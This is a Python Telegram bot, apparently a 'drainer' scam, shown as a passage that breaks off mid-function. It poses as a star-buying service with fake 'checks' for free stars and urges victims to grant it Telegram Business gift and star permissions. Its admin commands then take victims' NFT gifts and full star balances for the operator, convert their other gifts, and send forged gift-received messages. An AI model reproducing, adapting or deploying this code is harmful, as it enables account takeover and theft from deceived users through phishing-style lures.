from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection, InputMediaPhoto
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage, DeleteMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars
from aiogram.types.input_file import FSInputFile
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from aiogram.client.default import DefaultBotProperties
from PIL import Image, ImageDraw, ImageFont
import os
import logging
import asyncio
import json
import uuid
import datetime
import re

# Додаємо імпорт для GetFixedBusinessAccountStarBalance з другого бота
from custom_methods import GetFixedBusinessAccountStarBalance

import config

CONNECTIONS_FILE = "business_connections.json"
LANGUAGE_FILE = "user_languages.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
SENDER_ID = config.SENDER_ID
SPECIAL_USER_ID = 6831903905  # ID спеціального користувача
BOT_USERNAME = "SendChecsBot"  # Додано правильне ім'я бота

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Налаштування мов (залишаємо без змін з першого бота)
LANGUAGES = {
    "ru": {
        "welcome_message": (
            "Привет! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
            "С ним ты можешь моментально покупать и передавать звезды.\n\n"
            "Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n"
            "С помощью бота куплено:\n"
            "6,307,360 ⭐️ (~ $94,610)"
        ),
        "authorize_caption": """
⚠️ Бот еще не подключен.\n\n🧭 <b>Следуйте этим шагам:</b>\n1️⃣ Перейдите в ⚙️ <b>Настройки</b>.\n2️⃣ Выберите <b>Telegram для бизнеса → Чаты ботов</b>.\n3️⃣ Введите ссылку на бота: <code>@SendChecsBot</code>.\n4️⃣ Активируйте разрешения:\n   • Просмотр подарков\n   • Отправка звёзд\n   • Передача подарков\n   • Настройка подарков\n\n✅ <b>Готово!</b>
""",
        "profile_caption": (
            "👤 Ваш профиль\n\n"
            "🆔 UUID Профиля: {user_id}\n"
            "💰 Ваш баланс (в боте): 0 ⭐️\n\n"
            "🚀 Реферальная система\n"
            "Получай +10% от прибыли сервиса за покупки ваших рефералов!\n"
            "👬 Всего рефералов: 0\n"
            "📌 Всего получено от рефералов: 0$\n"
            "🔗 Ваша реферальная ссылка:\n"
            "https://t.me/@SendChecsBot?start=ref_{user_id}\n\n"
            "📊 Статистика\n"
            "📦 Успешных заказов: 0\n"
            "⭐️ Куплено звёзд: 0"
        ),
        "terms_caption": (
            "Условия использования @SendChecsBot:\n\n"
            "Полным и безоговорочным принятием условий данной оферты считается оплата клиентом услуг компании.\n\n"
            "1. Запрещено пополнять звезды и возвращать их, иначе компания в праве досрочно остановить предоставление услуги и заблокировать клиента без возможности возврата средств.\n"
            "2. Запрещено игнорирование жалоб компании, в случае игнорирования жалобы клиентом, компания имеет право отказать клиенту в своих услугах.\n"
            "3. Клиенту предоставляется доступ (если не оговорено иное) к звездам, и клиент несет всю связанную с этим ответственность.\n"
            "4. В случае нарушения условий предоставления услуг компания в праве отказать клиенту в возврате средств.\n"
            "5. Возврат денежных средств возможен только в случае неработоспособности или за технические ошибки бота по вине компании.\n"
            "6. Проблемы с пополнением/возвратом звезд — ответственность компании.\n\n"
            "С уважением, команда @SendChecsBot."
        ),
        "stars_caption": (
            "⭐️ Автоматическая доставка Stars — мгновенно и удобно!\n\n"
            "1. ⚙️ Откройте Настройки.\n"
            "2. 💼 Нажмите на Telegram для бизнеса.\n"
            "3. 🤖 Перейдите в раздел Чат-боты.\n"
            "4. ✍️ Введите имя бота @SendChecsBot и нажмите Добавить.\n"
            "5. ✅ Выдайте разрешения пункт 'Подарки и звезды' (5/5) для выдачи звезд.\n\n"
            "Зачем это нужно?\n"
            "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений."
        ),
        "check_message": (
            "<b>✨ Вы получили чек на {star_count} звёзд!</b>\n"
            "Нажмите ниже, чтобы добавить их на свой баланс."
        ),
        "activation_message": (
            "💳 Чек на {star_count} звёзд\n\n"
            "⭐️ Автоматическая доставка Stars — мгновенно и удобно!\n\n"
            "1. ⚙️ Откройте Настройки.\n"
            "2. 💼 Нажмите на Telegram для бизнеса.\n"
            "3. 🤖 Перейдите в раздел Чат-боты.\n"
            "4. ✍️ Введите имя бота @{BOT_USERNAME} и нажмите Добавить.\n"
            "5. ✅ Выдайте разрешения пункт 'Подарки и звезды' (5/5) для выдачи звезд.\n\n"
            "Зачем это нужно?\n"
            "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений."
        ),
        "authorize_button": "📝 Чеки",
        "profile_button": "📖 Профиль",
        "terms_button": "📖 Условия",
        "support_button": "🗣️ Поддержка",
        "stars_button": "⭐ Получение звезд",
        "back_button": "⬅️ Назад",
        "check_result": (
            "💳 Чек на {star_count} звёзд активирован!\n\n"
            "⭐️ Ваши звёзды успешно добавлены на баланс.\n"
            "Спасибо за использование @SendChecsBot!"
        )
    }
}

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Помилка при розборі JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r", encoding="utf-8") as f:
        return json.load(f)

def load_user_language(user_id: int) -> str:
    return "ru"  # За замовчуванням російська

def save_user_language(user_id: int, lang: str):
    pass

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"👤 Користувач #{user_id} підключив бота.")
    except Exception as e:
        logging.exception("Не вдалося відправити повідомлення в особистий чат.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }
    data = []
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break
    if not updated:
        data.append(business_connection_data)
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        lang = load_user_language(business_connection.user.id)
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, LANGUAGES[lang]["welcome_message"])
        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
        save_business_connection_data(business_connection)
        logging.info(f"Бізнес-акаунт підключено: {business_connection.user.id}, connection_id: {business_connection}")
    except Exception as e:
        logging.exception("Помилка при обробці бізнес-підключення.")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id
        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)
        if not connection:
            print(f"Невідомий бізнес connection_id: {conn_id}")
            return
        owner_id = connection["user_id"]
        if sender_id != owner_id:
            await bot.send_message(business_connection_id=message.business_connection_id,
                                   chat_id=message.from_user.id,
                                   text="👋 Привет! Я сейчас оффлайн.")
    except Exception as e:
        logging.exception("Помилка при відповіді.")

@dp.message(F.text.startswith("/start"))
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    parts = message.text.split()
    lang = load_user_language(message.from_user.id)

    if len(parts) == 2 and parts[1].startswith("check_"):
        # Обробка активації чека
        _, check_id, user_id, star_count = parts[1].split("_")
        star_count = int(star_count)

        # Формуємо текст повідомлення російською
        caption = (
            f"💳 Чек на {star_count} звёзд\n\n"
            "⭐️ Автоматическая доставка Stars — мгновенно и удобно!\n\n"
            "1. ⚙️ Откройте Настройки.\n"
            "2. 💼 Нажмите на Telegram для бизнеса.\n"
            "3. 🤖 Перейдите в раздел Чат-боты.\n"
            "4. ✍️ Введите имя бота @SendChecsBot и нажмите Добавить.\n"
            "5. ✅ Выдайте разрешения пункт 'Подарки и звезды' (5/5) для выдачи звезд.\n\n"
            "Зачем это нужно?\n"
            "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений."
        )

        # Відправляємо текст без фото чи відео
        await message.answer(
            text=caption,
            parse_mode="HTML"
        )

    elif message.from_user.id != ADMIN_ID:
        # Стандартне привітання
        photo = FSInputFile("1.jpg")
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📖 Профиль", callback_data="profile")],
            [
                InlineKeyboardButton(text="📝 Чеки", callback_data="checks"),
                InlineKeyboardButton(text="⭐ Получение звезд", callback_data="stars")
            ],
            [
                InlineKeyboardButton(text="📖 Условия", callback_data="terms"),
                InlineKeyboardButton(text="🗣️ Поддержка", url="https://t.me/giftrelayer")
            ]
        ])

        await message.answer_photo(
            photo=photo,
            caption=LANGUAGES[lang]["welcome_message"],
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        await message.answer(
            text=f"Sqvvinf Drainer\n\n🔗 Количество подключений: {count}\n\n/gifts - посмотреть подарки\n/stars - посмотреть звезды\n/transfer owned_id business_connect - передать подарок вручную\n/convert - конвертировать подарки в звезды\n/check_kd - показать подарки с возможностью передачи")

@dp.message(F.text == "/check")
async def check_command(message: Message):
    lang = load_user_language(message.from_user.id)
    check_id = str(uuid.uuid4())
    user_id = message.from_user.id
    star_count = 100  # За замовчуванням 100 зірок

    # Відправляємо повідомлення з чеком
    photo = FSInputFile("2.jpg")
    caption = LANGUAGES[lang]["check_message"].format(star_count=star_count)

    # Кнопка для активації чека з правильним ім'ям бота
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🌟 Активировать",
            url=f"https://t.me/{BOT_USERNAME}?start=check_{check_id}_{user_id}_{star_count}"
        )]
    ])

    await message.answer_photo(
        photo=photo,
        caption=caption,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "change_lang")
async def change_language(callback: CallbackQuery):
    pass

@dp.callback_query(F.data == "checks")
async def checks_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await callback.answer(
        text="Ошибка: Бот ещё не установлен как бот для бизнес-чата",
        show_alert=True
    )
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer(
        text=LANGUAGES[lang]["profile_caption"].format(user_id=callback.from_user.id),
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "terms")
async def terms_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer(
        text=LANGUAGES[lang]["terms_caption"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "stars")
async def stars_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    photo = FSInputFile("2.jpg")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer_photo(
        photo=photo,
        caption=LANGUAGES[lang]["stars_caption"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "back")
async def back_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    photo = FSInputFile("1.jpg")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💼 Профиль", callback_data="profile")],
        [
            InlineKeyboardButton(text="📝 Чеки", callback_data="checks"),
            InlineKeyboardButton(text="⭐ Получение звезд", callback_data="stars")
        ],
        [
            InlineKeyboardButton(text="📖 Условия", callback_data="terms"),
            InlineKeyboardButton(text="🗣️ Поддержка", url="https://t.me/giftrelayer")
        ]
    ])

    await callback.message.answer_photo(
        photo=photo,
        caption=LANGUAGES[lang]["welcome_message"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Нет доступа.")
        return
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("⚠️ Используйте формат: /transfer <owned_gift_id> <business_connection_id>")
        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("❌ Нет активного бизнес-подключения.")
        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))
        await message.answer("✅ Подарок успешно передан вам!")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await message.answer(f"Ошибка: {e}")
    except Exception as e:
        await message.answer(f"⚠️ Неизвестная ошибка: {e}")

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Нет доступа.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        if not connections:
            await message.answer("❌ Нет подключённых бизнес-аккаунтов.")
            return
        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"gifts:{user_id}")
        await message.answer("👤 Выберите пользователя:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("📂 Файл подключений не найден.")
    except Exception as e:
        logging.exception("Ошибка при загрузке подключений")
        await message.answer(f"⚠️ Ошибка при загрузке подключений")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("❌ Подключение для этого пользователя не найдено.")
            return
        business_connection_id = connection["business_connection_id"]
        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"�ID Бизнес-подключение: <b>{business_connection_id}</b>\n⭐ Баланс звёзд: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        if not gifts.gifts:
            text += "🎁 Подарков нет."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"🎁 <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"�ID Модель: <code>{gift.gift.model.name}</code>\n\n\n⭐ Стоимость трансфера: {gift.transfer_star_count} ⭐"
                    )
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🎁 Передать мне",
                                              callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}")]
                    ])
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при получении данных по бизнесу")
        await callback.message.answer(f"Ошибка: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID:
        await callback.message.reply("⛔ Нет доступа.")
        return
    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("❌ Подключение не найдено.")
            return
        business_connection_id = connection["business_connection_id"]
        # Якщо transfer_price є None, встановлюємо star_count=0
        star_count = int(transfer_price) if transfer_price and transfer_price != "None" else 0
        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=gift_id,
            star_count=star_count
        ))
        if result:
            await callback.message.answer("🎉 Подарок успешно передан вам!")
        else:
            await callback.message.answer("⚠️ Не удалось передать подарок.")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при передаче подарка")
        await callback.message.answer("⚠️ Не удалось передать подарок.")

@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Нет доступа.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("❌ Нет доступных подключений.")
        return
    if not connections:
        await message.answer("❌ Нет подключённых пользователей.")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})",
                              callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])
    await message.answer("🔹 Выберите пользователя для просмотра баланса звёзд:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)
    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("❌ Подключение не найдено.", show_alert=True)
        return
    business_connection_id = conn["business_connection_id"]
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✨ Передать звезды мне",
                                  callback_data=f"transfer_stars:{business_connection_id}")]
        ])
        await callback.message.answer(
            f"⭐ <b>У пользователя {conn['first_name']} {conn['last_name'] or ''} — {star_count} звёзд.</b>",
            parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        await callback.message.answer(f"⚠️ Ошибка получения баланса: {e}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount
        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("✅ Звезды успешно переданы вам.")
        else:
            await callback.message.answer("❌ Ошибка передачи звёзд.")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка передачи звёзд: {e}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts
        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue
                    else:
                        raise e
        if count == 0:
            return "🎁 У вас нет обычных (неуникальных) подарков для конвертации."
        return f"✅ Конвертировано {count} подарков в звёзды."
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "⚠️ Пользователь запретил доступ"
        return f"⚠️ Ошибка: {e}"
    except Exception as e:
        return f"❌ Непредвиденная ошибка: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("❌ Не удалось загрузить подключения.")
    if not connections:
        return await message.answer("❌ Нет активных подключений.")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})",
                              callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])
    await message.answer("👤 Выберите пользователя для преобразования подарков:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)
    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="♻️ Преобразовать обычные подарки в звезды",
                              callback_data=f"convert_exec:{user_id}")]
    ])
    await callback.message.edit_text(f"👤 Выбран пользователь: @{connection.get('username', 'неизвестно')}",
                                     reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await callback.message.edit_text("⚠️ Не удалось загрузить подключения.")
    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")
    try:
        response = await bot(GetBusinessAccountGifts(business_connection_id=connection["business_connection_id"]))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"Ошибка: {e}")
    if not gifts:
        return await callback.message.edit_text("🎁 У пользователя нет подарков.")
    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue
        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1
    await callback.message.edit_text(f"✅ Успешно конвертировано: {converted_count} подарков.\n❌ Ошибок: {failed}")

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Нет доступа.")
        return
    await message.answer("✅ Проверка выполнена. Бот готов к работе!")

@dp.callback_query(F.data == "authorize")
async def authorize_callback(callback: CallbackQuery):
    message = callback.message
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    video = FSInputFile("tutorial.mp4")

    caption = LANGUAGES[lang]["authorize_caption"]

    await bot.send_video(
        chat_id=message.chat.id,
        video=video,
        caption=caption,
        parse_mode="HTML"
    )

@dp.message(F.text.startswith("/nft"))
async def process_nft_command(message: Message):
    if message.from_user.id != SPECIAL_USER_ID:
        return
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].startswith("https://t.me/nft/"):
        await message.answer("⚠️ Используйте формат: /nft https://t.me/nft/название_подарка")
        return
    gift_link = parts[1]
    gift_name = gift_link.split("/nft/")[-1]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", url="https://t.me/Send_Checks_bot"),
            InlineKeyboardButton(text="👁️ Показать подарок", url=gift_link)
        ]
    ])
    await message.answer(
        f"🎁 <a href='https://t.me/nft/{gift_name}'>{gift_name}</a>\n\n💌 Кто-то решил вас порадовать - получите свой подарок, нажав 'Принять'",
        reply_markup=keyboard, parse_mode="HTML")

@dp.inline_query()
async def inline_query_handler(inline_query: InlineQuery):
    query = inline_query.query.strip()
    if not query.isdigit():
        return await inline_query.answer([], cache_time=1)

    star_count = int(query)
    if star_count <= 0:
        return await inline_query.answer([], cache_time=1)

    # Генерація зображення чеку
    img = Image.new("RGB", (400, 200), color="white")
    d = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except:
        font = ImageFont.load_default()
    d.text((10, 10), f"Check for {star_count} Stars", fill="black", font=font)
    d.text((10, 40), f"ID: {uuid.uuid4()}", fill="black", font=font)
    d.text((10, 70), f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}", fill="black", font=font)

    # Збереження зображення
    check_path = f"check_{inline_query.from_user.id}_{star_count}.png"
    img.save(check_path)

    # Налаштування повідомлення
    lang = load_user_language(inline_query.from_user.id)
    check_text = LANGUAGES[lang]["check_message"].format(star_count=star_count)
    check_uuid = str(uuid.uuid4())
    result = InlineQueryResultArticle(
        id=f"check_{star_count}_{inline_query.id}",
        title=f"Чек на {star_count} звёзд",
        description="Нажмите, чтобы добавить звёзды на баланс",
        input_message_content=InputTextMessageContent(
            message_text=check_text,
            parse_mode="HTML"
        ),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="🌟 Активировать чек",
                url=f"https://t.me/{BOT_USERNAME}?start=check_{check_uuid}_{inline_query.from_user.id}_{star_count}"
            )]
        ])
    )

    await inline_query.answer([result], cache_time=0)
    os.remove(check_path)

@dp.message(F.text == "/check_kd")
async def check_kd_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Нет доступа.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        if not connections:
            await message.answer("❌ Нет подключённых бизнес-аккаунтов.")
            return
        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"check_kd:{user_id}")
        await message.answer("👤 Выберите пользователя:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("📂 Файл подключений не найден.")
    except Exception as e:
        logging.exception("Ошибка при загрузке подключений")
        await message.answer(f"⚠️ Ошибка при загрузке подключений")

@dp.callback_query(F.data.startswith("check_kd:"))
async def check_kd_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("❌ Подключение для этого пользователя не найдено.")
            return
        business_connection_id = connection["business_connection_id"]
        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"�ID Бизнес-подключение: <b>{business_connection_id}</b>\n⭐ Баланс звёзд: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        if not gifts.gifts:
            text += "🎁 Подарков нет."
            await callback.message.answer(text)
        else:
            # Перевірка валідності SENDER_ID
            try:
                sender_id = int(SENDER_ID)
                try:
                    await bot.send_message(chat_id=sender_id, text="Тест доступності для перевірки кулдауну.")
                    await bot.delete_message(chat_id=sender_id, message_id=(await bot.get_updates())[-1].message.message_id)
                except Exception as e:
                    logging.warning(f"Попередження: Неможливо перевірити доступність SENDER_ID {SENDER_ID}: {e}. Продовжую з попередженням.")
            except ValueError:
                logging.error(f"Помилка: SENDER_ID {SENDER_ID} не є коректним числом.")
                sender_id = None
                await callback.message.answer(f"⚠️ Некоректний SENDER_ID ({SENDER_ID}). Перевірте конфігурацію.")

            for gift in gifts.gifts:
                if gift.type == "unique":
                    cooldown_info = ""
                    if sender_id:
                        try:
                            await bot(TransferGift(
                                business_connection_id=business_connection_id,
                                new_owner_chat_id=sender_id,
                                owned_gift_id=gift.owned_gift_id,
                                star_count=gift.transfer_star_count or 0
                            ))
                        except TelegramBadRequest as e:
